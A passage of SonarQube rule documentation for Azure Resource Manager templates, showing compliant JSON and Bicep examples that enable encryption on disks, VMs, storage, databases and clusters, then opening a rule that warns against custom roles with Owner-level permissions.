  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Compute/disks",
      "apiVersion": "2022-07-02",
      "properties": {
        "encryptionSettingsCollection": {
          "enabled": true,
          "encryptionSettings": [
            {
              "diskEncryptionKey": {
                "secretUrl": "string",
                "sourceVault": {
                  "id": "string"
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {
  properties: {
    encryptionSettingsCollection: {
      enabled: true
      encryptionSettings: [
        {
          diskEncryptionKey: {
            secretUrl: 'string'
            sourceVault: {
              id: 'string'
            }
          }
        }
      ]
    }
  }
}
</pre>
<p>Enabled encryption through a security profile for an OS disk:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Compute/disks",
      "apiVersion": "2022-07-02",
      "properties": {
        "securityProfile": {
          "secureVMDiskEncryptionSetId": "string",
          "securityType": "{'ConfidentialVM_DiskEncryptedWithCustomerKey' | 'ConfidentialVM_DiskEncryptedWithPlatformKey' | 'ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey' | 'TrustedLaunch'}"
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {
  properties: {
    securityProfile: {
      secureVMDiskEncryptionSetId: 'string'
      securityType: '{ConfidentialVM_DiskEncryptedWithCustomerKey | ConfidentialVM_DiskEncryptedWithPlatformKey | ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey | TrustedLaunch}'
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots">Microsoft.Compute/snapshots</a>:</p>
<p>Enabled disk encryption for snapshot:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/snapshots",
      "apiVersion": "2022-07-02",
      "properties": {
        "encryption": {
          "diskEncryptionSetId": "string",
          "type": "{'EncryptionAtRestWithCustomerKey' | 'EncryptionAtRestWithPlatformAndCustomerKeys' | 'EncryptionAtRestWithPlatformKey'}"
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {
  properties: {
    encryption: {
      diskEncryptionSetId: 'string'
      type: '{EncryptionAtRestWithCustomerKey | EncryptionAtRestWithPlatformAndCustomerKeys | EncryptionAtRestWithPlatformKey}'
    }
  }
}
</pre>
<p>Enabled disk encryption with settings collection:</p>
<pre data-diff-id="402" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/snapshots",
      "apiVersion": "2022-07-02",
      "properties": {
        "encryptionSettingsCollection": {
          "enabled": true,
          "encryptionSettings": [
            {
              "diskEncryptionKey": {
                "secretUrl": "",
                "sourceVault": {
                  "id": "string"
                }
              }
            }
          ],
          "encryptionSettingsVersion": "{'1.0' | '1.1'}"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="412" data-diff-type="compliant">
resource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {
  properties: {
    encryptionSettingsCollection: {
      enabled: true
      encryptionSettings: [
        {
          diskEncryptionKey: {
            secretUrl: ''
            sourceVault: {
              id: 'string'
            }
          }
        }
      ]
      encryptionSettingsVersion: '{1.0 | 1.1}'
    }
  }
}
</pre>
<p>Enabled disk encryption through security profile:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/snapshots",
      "apiVersion": "2022-07-02",
      "properties": {
        "securityProfile": {
          "secureVMDiskEncryptionSetId": "string",
          "securityType": "{'ConfidentialVM_DiskEncryptedWithCustomerKey' | 'ConfidentialVM_DiskEncryptedWithPlatformKey' | 'ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey' |'TrustedLaunch'}"
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {
  properties: {
    securityProfile: {
      secureVMDiskEncryptionSetId: 'string'
      securityType: '{ConfidentialVM_DiskEncryptedWithCustomerKey | ConfidentialVM_DiskEncryptedWithPlatformKey | ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey | TrustedLaunch}'
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines">Microsoft.Compute/virtualMachines</a>:</p>
<p>Enabled encryption at host level:</p>
<pre data-diff-id="101" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "securityProfile": {
          "encryptionAtHost": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="111" data-diff-type="compliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    securityProfile: {
      encryptionAtHost: true
    }
  }
}
</pre>
<p>Enabled encryption for managed disk:</p>
<pre data-diff-id="102" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "dataDisks": [
            {
              "id": "myDiskId",
              "managedDisk": {
                "diskEncryptionSet": {
                  "id": "string"
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="112" data-diff-type="compliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      dataDisks: [
        {
          name: 'myDisk'
          managedDisk: {
            diskEncryptionSet: {
              id: 'string'
            }
          }
        }
      ]
    }
  }
}
</pre>
<p>Enabled encryption for managed disk through security profile:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "dataDisks": [
            {
              "id": "myDiskId",
              "managedDisk": {
                "securityProfile": {
                  "diskEncryptionSet": {
                    "id": "string"
                  }
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre>
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      dataDisks: [
        {
          name: 'myDisk'
          managedDisk: {
            securityProfile: {
              diskEncryptionSet: {
                id: 'string'
              }
            }
          }
        }
      ]
    }
  }
}
</pre>
<p>Enabled encryption for OS disk:</p>
<pre data-diff-id="104" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "osDisk": {
            "encryptionSettings": {
              "enabled": true,
              "diskEncryptionKey": {
                "secretUrl": "string",
                "sourceVault": {
                  "id": "string"
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="114" data-diff-type="compliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      osDisk: {
        name: 'myDisk'
        encryptionSettings: {
          enabled: true
          diskEncryptionKey: {
            secretUrl: 'string'
            sourceVault: {
              id: 'string'
            }
          }
        }
      }
    }
  }
}
</pre>
<p>Enabled encryption for OS managed disk:</p>
<pre data-diff-id="105" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "osDisk": {
            "managedDisk": {
              "id": "myDiskId",
              "diskEncryptionSet": {
                "id": "string"
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="115" data-diff-type="compliant">
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      osDisk: {
        name: 'myDisk'
        managedDisk: {
          id: 'myDiskId'
          diskEncryptionSet: {
            id: 'string'
          }
        }
      }
    }
  }
}
</pre>
<p>Enabled encryption for OS managed disk through security profile:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachines",
      "apiVersion": "2022-11-01",
      "properties": {
        "storageProfile": {
          "osDisk": {
            "managedDisk": {
              "securityProfile": {
                "diskEncryptionSet": {
                  "id": "string"
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre>
resource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {
  properties: {
    storageProfile: {
      osDisk: {
        name: 'myDisk'
        managedDisk: {
          id: 'myDiskId'
          securityProfile: {
            diskEncryptionSet: {
              id: 'string'
            }
          }
        }
      }
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines">Microsoft.Compute/virtualMachineScaleSets</a>:</p>
<p>Enabled encryption at host level:</p>
<pre data-diff-id="201" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "securityProfile": {
            "encryptionAtHost": true
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="211" data-diff-type="compliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      securityProfile: {
        encryptionAtHost: true
      }
    }
  }
}
</pre>
<p>Enabled encryption for data disk:</p>
<pre data-diff-id="202" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "dataDisks": [
              {
                "name": "myDataDisk",
                "managedDisk": {
                  "diskEncryptionSet": {
                    "id": "string"
                  }
                }
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="212" data-diff-type="compliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        dataDisks: [
          {
            name: 'myDataDisk'
            managedDisk: {
              diskEncryptionSet: {
                id: 'string'
              }
            }
          }
        ]
      }
    }
  }
}
</pre>
<p>Enabled encryption for data disk through security profile:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "dataDisks": [
              {
                "name": "myDataDisk",
                "managedDisk": {
                  "securityProfile": {
                    "diskEncryptionSet": {
                      "id": "string"
                    }
                  }
                }
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        dataDisks: [
          {
            name: 'myDataDisk'
            managedDisk: {
              securityProfile: {
                diskEncryptionSet: {
                  id: 'string'
                }
              }
            }
          }
        ]
      }
    }
  }
}
</pre>
<p>Enabled encryption for OS disk:</p>
<pre data-diff-id="204" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "osDisk": {
              "name": "myOsDisk",
              "managedDisk": {
                "diskEncryptionSet": {
                  "id": "string"
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="214" data-diff-type="compliant">
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        osDisk: {
          name: 'myOsDisk'
          managedDisk: {
            diskEncryptionSet: {
              id: 'string'
            }
          }
        }
      }
    }
  }
}
</pre>
<p>Enabled encryption for OS disk through security profile:</p>
<pre>
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Compute/virtualMachineScaleSets",
      "apiVersion": "2022-11-01",
      "properties": {
        "virtualMachineProfile": {
          "storageProfile": {
            "osDisk": {
              "name": "myOsDisk",
              "managedDisk": {
                "securityProfile": {
                  "diskEncryptionSet": {
                    "id": "string"
                  }
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre>
resource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {
  properties: {
    virtualMachineProfile: {
      storageProfile: {
        osDisk: {
          name: 'myOsDisk'
          managedDisk: {
            securityProfile: {
              diskEncryptionSet: {
                id: 'string'
              }
            }
          }
        }
      }
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters">Microsoft.ContainerService/managedClusters</a>:</p>
<p>Enabled encryption at host and set the disk encryption set ID:</p>
<pre data-diff-id="1101" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerService/managedClusters",
      "apiVersion": "2023-03-02-preview",
      "properties": {
        "agentPoolProfiles": [
          {
            "enableEncryptionAtHost": true
          }
        ],
        "diskEncryptionSetID": "string"
      }
    }
  ]
}
</pre>
<pre data-diff-id="1111" data-diff-type="compliant">
resource symbolicname 'Microsoft.ContainerService/managedClusters@2023-03-02-preview' = {
  properties: {
    agentPoolProfiles: [
      {
        enableEncryptionAtHost: true
      }
    ]
    diskEncryptionSetID: 'string'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts">Microsoft.DataLakeStore/accounts</a>:</p>
<p>Enabled encryption for Data Lake Store:</p>
<pre data-diff-id="501" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DataLakeStore/accounts",
      "apiVersion": "2016-11-01",
      "properties": {
        "encryptionState": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="511" data-diff-type="compliant">
resource symbolicname 'Microsoft.DataLakeStore/accounts@2016-11-01' = {
  properties: {
    encryptionState: 'Enabled'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers">Microsoft.DBforMySQL/servers</a>:</p>
<p>Enabled infrastructure double encryption for MySQL server:</p>
<pre data-diff-id="601" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DBforMySQL/servers",
      "apiVersion": "2017-12-01",
      "properties": {
        "infrastructureEncryption": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="611" data-diff-type="compliant">
resource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  properties: {
    infrastructureEncryption: 'Enabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers">Microsoft.DBforPostgreSQL/servers</a>:</p>
<p>Enabled infrastructure double encryption for PostgreSQL server:</p>
<pre data-diff-id="701" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DBforPostgreSQL/servers",
      "apiVersion": "2017-12-01",
      "properties": {
        "infrastructureEncryption": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="711" data-diff-type="compliant">
resource symbolicname 'Microsoft.DBforPostgreSQL/servers@2017-12-01' = {
  properties: {
    infrastructureEncryption: 'Enabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>
<p>Enabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>
<pre data-diff-id="901" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "cassandraClusters/example",
      "type": "Microsoft.DocumentDB/cassandraClusters/dataCenters",
      "apiVersion": "2023-04-15",
      "properties": {
        "diskCapacity": 4,
        "backupStorageCustomerKeyUri": "string",
        "managedDiskCustomerKeyUri": "string"
      }
    }
  ]
}
</pre>
<pre data-diff-id="911" data-diff-type="compliant">
resource symbolicname 'Microsoft.DocumentDB/cassandraClusters/dataCenters@2023-04-15' = {
  name: 'string'
  parent: parent
  properties: {
    diskCapacity: 4
    backupStorageCustomerKeyUri: 'string'
    managedDiskCustomerKeyUri: 'string'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters">Microsoft.HDInsight/clusters</a>:</p>
<p>Enabled encryption for data disk:</p>
<pre data-diff-id="1301" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.HDInsight/clusters",
      "apiVersion": "2021-06-01",
      "properties": {
        "computeProfile": {
          "roles": [
            {
              "encryptDataDisks": true
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1311" data-diff-type="compliant">
resource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {
  properties: {
    computeProfile: {
      roles: [
        {
          encryptDataDisks: true
        }
      ]
    }
  }
}
</pre>
<p>Enabled encryption for data disk at application level:</p>
<pre data-diff-id="1302" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "clusters/example",
      "type": "Microsoft.HDInsight/clusters/applications",
      "apiVersion": "2021-06-01",
      "properties": {
        "computeProfile": {
          "roles": [
            {
              "encryptDataDisks": true
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1312" data-diff-type="compliant">
resource symbolicname 'Microsoft.HDInsight/clusters/applications@2021-06-01' = {
  properties: {
    computeProfile: {
      roles: [
        {
          encryptDataDisks: true
        }
      ]
    }
  }
}
</pre>
<p>Enabled encryption for resource disk:</p>
<pre data-diff-id="1303" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.HDInsight/clusters",
      "apiVersion": "2021-06-01",
      "properties": {
        "diskEncryptionProperties": {
          "encryptionAtHost": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1313" data-diff-type="compliant">
resource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {
  properties: {
    diskEncryptionProperties: {
      encryptionAtHost: true
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters">Microsoft.Kusto/clusters</a>:</p>
<p>Enabled encryption for disk:</p>
<pre data-diff-id="1401" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Kusto/clusters",
      "apiVersion": "2022-12-29",
      "properties": {
        "enableDiskEncryption": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="1411" data-diff-type="compliant">
resource symbolicname 'Microsoft.Kusto/clusters@2022-12-29' = {
  properties: {
    enableDiskEncryption: true
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults">Microsoft.RecoveryServices/vaults</a>:</p>
<p>Enabled encryption on infrastructure:</p>
<pre data-diff-id="1501" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.RecoveryServices/vaults",
      "apiVersion": "2023-01-01",
      "properties": {
        "encryption": {
          "infrastructureEncryption": "Enabled"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1511" data-diff-type="compliant">
resource symbolicname 'Microsoft.RecoveryServices/vaults@2023-01-01' = {
  properties: {
    encryption: {
      infrastructureEncryption: 'Enabled'
    }
  }
}
</pre>
<p>Enabled encryption on infastructure for backup:</p>
<pre data-diff-id="1502" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "vaults/example",
      "type": "Microsoft.RecoveryServices/vaults/backupEncryptionConfigs",
      "apiVersion": "2023-01-01",
      "properties": {
        "encryptionAtRestType": "{'CustomerManaged' | 'MicrosoftManaged'}",
        "infrastructureEncryptionState": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="1512" data-diff-type="compliant">
resource symbolicname 'Microsoft.RecoveryServices/vaults/backupEncryptionConfigs@2023-01-01' = {
  properties: {
    encryptionAtRestType: '{CustomerManaged | MicrosoftManaged}'
    infrastructureEncryptionState: 'Enabled'
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>
<p>Enabled disk encryption for master profile and worker profiles:</p>
<pre data-diff-id="1601" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.RedHatOpenShift/openShiftClusters",
      "apiVersion": "2022-09-04",
      "properties": {
        "masterProfile": {
          "diskEncryptionSetId": "string",
          "encryptionAtHost": "Enabled"
        },
        "workerProfiles": [
          {
            "diskEncryptionSetId": "string",
            "encryptionAtHost": "Enabled"
          }
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="1611" data-diff-type="compliant">
resource symbolicname 'Microsoft.RedHatOpenShift/openShiftClusters@2022-09-04' = {
  properties: {
    masterProfile: {
      diskEncryptionSetId: 'string'
      encryptionAtHost: 'Enabled'
    }
    workerProfiles: [
      {
        diskEncryptionSetId: 'string'
        encryptionAtHost: 'Enabled'
      }
    ]
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>
<p>Enabled encryption for SQL Virtual Machine:</p>
<pre data-diff-id="801" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.SqlVirtualMachine/sqlVirtualMachines",
      "apiVersion": "2022-08-01-preview",
      "properties": {
        "autoBackupSettings": {
          "enableEncryption": true,
          "password": "string"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="811" data-diff-type="compliant">
resource symbolicname 'Microsoft.SqlVirtualMachine/sqlVirtualMachines@2022-08-01-preview' = {
  properties: {
    autoBackupSettings: {
      enableEncryption: true
      password: 'string'
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts">Microsoft.Storage/storageAccounts</a>:</p>
<p>Enabled enforcing of infrastructure encryption for double encryption of data:</p>
<pre data-diff-id="1001" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Storage/storageAccounts",
      "apiVersion": "2022-09-01",
      "properties": {
        "encryption": {
          "requireInfrastructureEncryption": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="1011" data-diff-type="compliant">
resource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {
  properties: {
    encryption: {
      requireInfrastructureEncryption: true
    }
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots=deployment-language-bicep">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>
<p>Enabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>
<pre data-diff-id="1002" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "storageAccounts/example",
      "type": "Microsoft.Storage/storageAccounts/encryptionScopes",
      "apiVersion": "2022-09-01",
      "properties": {
        "requireInfrastructureEncryption": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="1012" data-diff-type="compliant">
resource symbolicname 'Microsoft.Storage/storageAccounts/encryptionScopes@2022-09-01' = {
  properties: {
    requireInfrastructureEncryption: true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">Data encryption in Amazon EFS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/backup/backup-encryption">Encryption in Azure Backup</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security">Security in Azure Database for MySQL</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security">Security in Azure Database for PostgreSQL</a>
  </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs=portal">Infrastructure double encryption
  of data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6385">
              azureresourcemanager:S6385
            </a>
          </td>
          <td>
            <details>
              <p>Defining a custom role at the <code>Subscription</code> or <code>Management group</code> scope that allows all actions will give it the same
capabilities as the built-in <code>Owner</code> role.</p>
<h2>Why is this an issue?</h2>
<p>In Azure, the <code>Owner</code> role of a <code>Subscription</code> or a <code>Management group</code> provides entities it is assigned to with
the maximum level of privileges. The <code>Owner</code> role allows managing all resources and assigning any role to other entities.</p>
<p>Because it is a powerful entitlement, it should be granted to as few users as possible.</p>
<p>When a custom role has the same level of permissions as the <code>Owner</code> one, there are greater chances that high privileges are granted to
too many users.</p>
<h3>What is the potential impact?</h3>
<p>Custom roles that provide the same level of permissions as <code>Owner</code> might indicate a configuration issue. Any entity assigned with it can
perform any action on the <code>Subscription</code> or <code>Management group</code>, including changing roles and permissions.</p>
<p>If the affected role is unexpectedly assigned to users, they can compromise the affected scope. They can do so in the long term by assigning
dangerous roles to other users or entities.</p>
<p>Depending on the scope to which the role is assignable, the exact impact of a successful exploitation may vary. It generally ranges from data
compromise to the takeover of the cloud infrastructure.</p>
<h4>Infrastructure takeover</h4>
<p>By obtaining the right role, an attacker can gain control over part or all of the Azure infrastructure. They can modify DNS settings, redirect
traffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing websites,
or distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>
<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>
<p>Furthermore, corporate Azure infrastructures are often connected to other services and to the internal networks of the organization. Because of
this, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more
services, to compromise more business-critical data, and to cause more damage to the overall infrastructure.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers with the correct role
could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity theft, financial loss, or
other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Financial loss</h4>
